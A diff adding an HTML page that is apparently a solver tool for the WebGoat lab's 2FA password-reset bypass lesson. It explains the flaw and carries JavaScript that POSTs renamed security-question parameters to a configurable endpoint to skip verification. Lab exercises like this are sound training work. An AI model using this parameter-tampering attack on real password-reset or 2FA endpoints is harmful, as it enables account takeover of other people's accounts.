@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>2FA Password Reset Bypass</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1100px;
+            margin: 50px auto;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #f5576c;
+            border-bottom: 3px solid #f093fb;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #f5576c;
+            margin-top: 30px;
+        }
+        .info {
+            background: #e3f2fd;
+            padding: 15px;
+            border-left: 4px solid #2196F3;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        .warning {
+            background: #fff3e0;
+            border-left-color: #ff9800;
+        }
+        .success {
+            background: #e8f5e9;
+            border-left-color: #4CAF50;
+        }
+        .danger {
+            background: #ffebee;
+            border-left-color: #f44336;
+        }
+        button {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        .code {
+            background: #263238;
+            color: #aed581;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+        #output {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
+            min-height: 100px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-size: 12px;
+        }
+        .payload-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        .payload-btn {
+            text-align: left;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        @media (max-width: 768px) {
+            .payload-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        input {
+            width: calc(100% - 24px);
+            padding: 10px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #f5576c;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 2FA Password Reset - Authentication Bypass</h1>
+        
+        <div class="info danger">
+            <strong>⚠️ Vulnerability:</strong> Parameter Tampering + Logic Flaw<br>
+            Based on real PayPal 2016 vulnerability (but different technique)
+        </div>
+
+        <div class="info">
+            <strong>Challenge:</strong> Bypass 2FA security questions by renaming parameters<br>
+            <strong>Hint:</strong> Don't delete parameters, rename them!<br>
+            <strong>Key:</strong> Server expects 2 questions but doesn't validate which ones
+        </div>
+
+        <h2>📖 The Story (PayPal 2016)</h2>
+        <div class="info warning">
+            <strong>What happened:</strong><br>
+            1. User couldn't receive SMS code<br>
+            2. Switched to security questions<br>
+            3. Instead of answering, attacker REMOVED parameters entirely<br>
+            4. Server said "OK" without checking answers! 💥<br><br>
+            
+            <strong>Your challenge is similar but different:</strong><br>
+            ❌ Don't delete parameters<br>
+            ✅ Rename secQuestion0 and secQuestion1<br>
+            ✅ Server will accept renamed parameters without validation
+        </div>
+
+        <h2>⚙️ Configuration</h2>
+        <label>WebGoat Base URL:</label>
+        <input type="text" id="baseUrl" value="http://192.168.254.112:8001" />
+          <label>Endpoint (if different):</label>
+        <input type="text" id="endpoint" value="/WebGoat/auth-bypass/verify-account" placeholder="/WebGoat/PasswordReset/verify" />
+        
+        <label>User ID (from form):</label>
+        <input type="text" id="userId" value="12309746" placeholder="Get from hidden input" />
+
+        <h2>🎯 Attack Methods</h2>
+        
+        <div class="payload-grid">
+            <button class="payload-btn" onclick="attack(1)">
+                🚀 Attack 1: Rename to Question 2 & 3
+            </button>
+            <button class="payload-btn" onclick="attack(2)">
+                🚀 Attack 2: Rename to Question 1 & 2
+            </button>
+            <button class="payload-btn" onclick="attack(3)">
+                🚀 Attack 3: Higher Numbers (5 & 6)
+            </button>
+            <button class="payload-btn" onclick="attack(4)">
+                🚀 Attack 4: Non-sequential (0 & 2)
+            </button>
+            <button class="payload-btn" onclick="attack(5)">
+                🚀 Attack 5: Wrong Names (X & Y)
+            </button>
+            <button class="payload-btn" onclick="attack(6)">
+                🚀 Attack 6: Empty Values
+            </button>
+        </div>
+
+        <button onclick="customAttack()">✏️ Custom Parameters</button>
+        <button onclick="clearOutput()">🧹 Clear Output</button>
+
+        <h2>Custom Attack</h2>
+        <label>Parameter 1 Name:</label>
+        <input type="text" id="param1Name" placeholder="e.g., secQuestion2" value="secQuestion2" />
+        <label>Parameter 1 Value:</label>
+        <input type="text" id="param1Value" placeholder="any value" value="bypass" />
+        
+        <label>Parameter 2 Name:</label>
+        <input type="text" id="param2Name" placeholder="e.g., secQuestion3" value="secQuestion3" />
+        <label>Parameter 2 Value:</label>
+        <input type="text" id="param2Value" placeholder="any value" value="attack" />
+
+        <h2>Output</h2>
+        <div id="output">Ready to attack...</div>
+
+        <h2>How It Works</h2>
+        <div class="info">
+            <strong>The Flaw:</strong><br>
+            Server checks: "Did I receive 2 parameters?" ✓<br>
+            Server DOESN'T check: "Are they the CORRECT parameters?" ❌<br><br>
+            
+            <strong>Normal Request:</strong>
+            <div class="code">secQuestion0=answer1&secQuestion1=answer2</div>
+            
+            <strong>Bypass Request:</strong>
+            <div class="code">secQuestion2=anything&secQuestion3=anything</div>
+            
+            Server thinks: "I got 2 parameters, must be valid!" 🤦
+        </div>
+
+        <h2>Expected Endpoints</h2>
+        <div class="info warning">
+            Try these if the default doesn't work:<br>
+            • /WebGoat/auth-bypass/verify-account<br>
+            • /WebGoat/PasswordReset/verify<br>
+            • /WebGoat/PasswordReset/verify-account<br>
+            • /WebGoat/PasswordReset/questions/verify<br>
+            • /WebGoat/authentication-bypasses/verify-account
+        </div>
+    </div>
+
+    <script>
+        const output = document.getElementById('output');
+
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const prefix = type === 'error' ? '❌' : type === 'success' ? '✅' : 'ℹ️';
+            output.textContent += `[${timestamp}] ${prefix} ${message}\n`;
+            output.scrollTop = output.scrollHeight;
+        }        async function attack(method) {
+            const baseUrl = document.getElementById('baseUrl').value.trim();
+            const endpoint = document.getElementById('endpoint').value.trim();
+            const userId = document.getElementById('userId').value.trim();
+            const url = baseUrl + endpoint;
+
+            let payload = '';
+            let description = '';
+
+            // Base parameters that are always included
+            const baseParams = `&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=${userId}`;
+
+            switch(method) {
+                case 1:
+                    payload = 'secQuestion2=bypass&secQuestion3=attack' + baseParams;
+                    description = 'Renamed to Question 2 & 3 (skipping 0 & 1)';
+                    break;
+                case 2:
+                    payload = 'secQuestion1=test&secQuestion2=test' + baseParams;
+                    description = 'Renamed to Question 1 & 2 (skipping 0)';
+                    break;
+                case 3:
+                    payload = 'secQuestion5=answer&secQuestion6=answer' + baseParams;
+                    description = 'Using higher numbers (5 & 6)';
+                    break;
+                case 4:
+                    payload = 'secQuestion0=value&secQuestion2=value' + baseParams;
+                    description = 'Non-sequential (0 & 2, skipping 1)';
+                    break;
+                case 5:
+                    payload = 'secQuestionX=bypass&secQuestionY=bypass' + baseParams;
+                    description = 'Wrong parameter names (X & Y)';
+                    break;
+                case 6:
+                    payload = 'secQuestion2=&secQuestion3=' + baseParams;
+                    description = 'Empty values with renamed parameters';
+                    break;
+            }
+
+            log(`Attack ${method}: ${description}`, 'info');
+            log(`URL: ${url}`, 'info');
+            log(`Payload: ${payload}`, 'info');
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: payload
+                });
+
+                const result = await response.text();
+                log(`Status: ${response.status}`, response.ok ? 'success' : 'error');
+                log(`Response:\n${result}`, 'info');
+
+                try {
+                    const json = JSON.parse(result);
+                    if (json.lessonCompleted || json.verified || json.success) {
+                        log('🎉 BYPASS SUCCESSFUL!', 'success');
+                    } else if (json.feedback) {
+                        log(`Feedback: ${json.feedback}`, 'info');
+                    }
+                } catch (e) {
+                    // Not JSON, that's OK
+                }
+            } catch (error) {
+                log(`Error: ${error.message}`, 'error');
+            }
+
+            log('---', 'info');
+        }        async function customAttack() {
+            const baseUrl = document.getElementById('baseUrl').value.trim();
+            const endpoint = document.getElementById('endpoint').value.trim();
+            const userId = document.getElementById('userId').value.trim();
+            const url = baseUrl + endpoint;
+
+            const param1Name = document.getElementById('param1Name').value.trim();
+            const param1Value = document.getElementById('param1Value').value.trim();
+            const param2Name = document.getElementById('param2Name').value.trim();
+            const param2Value = document.getElementById('param2Value').value.trim();
+
+            if (!param1Name || !param2Name) {
+                log('Please enter parameter names!', 'error');
+                return;
+            }
+
+            const payload = `${param1Name}=${encodeURIComponent(param1Value)}&${param2Name}=${encodeURIComponent(param2Value)}&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=${userId}`;
+
+            log('Custom Attack', 'info');
+            log(`URL: ${url}`, 'info');
+            log(`Payload: ${payload}`, 'info');
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: payload
+                });
+
+                const result = await response.text();
+                log(`Status: ${response.status}`, response.ok ? 'success' : 'error');
+                log(`Response:\n${result}`, 'info');
+
+                try {
+                    const json = JSON.parse(result);
+                    if (json.lessonCompleted || json.verified || json.success) {
+                        log('🎉 BYPASS SUCCESSFUL!', 'success');
+                    } else if (json.feedback) {
+                        log(`Feedback: ${json.feedback}`, 'info');
+                    }
+                } catch (e) {
+                    // Not JSON
+                }
+            } catch (error) {
+                log(`Error: ${error.message}`, 'error');
+            }
+
+            log('---', 'info');
+        }
+
+        function clearOutput() {
+            output.textContent = 'Output cleared.\n';
+            log('Ready for next attack', 'success');
+        }
+
+        // Initialize
+        log('2FA Authentication Bypass Tool loaded', 'success');
+        log('Click an attack button to try different bypass techniques', 'info');
+        log('', 'info');
+        log('Recommended order:', 'info');
+        log('1. Try Attack 1 first (most common bypass)', 'info');
+        log('2. If that fails, try Attack 2', 'info');
+        log('3. Then try other variations', 'info');
+    </script>
+</body>
+</html>
